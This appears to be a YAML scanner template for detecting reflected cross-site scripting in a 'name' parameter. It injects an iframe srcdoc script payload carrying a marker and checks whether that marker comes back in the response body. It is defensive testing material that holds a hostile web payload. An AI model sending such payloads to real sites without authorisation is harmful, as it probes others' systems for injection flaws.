id: xss2-125
name: 'Reflected XSS2 ctx-4 via name'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in name'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      name:
        - '<iframe srcdoc="<script>alert(nx2124)</script>">'
    matchers:
      - type: word
        part: body
        words:
          - 'nx2124'
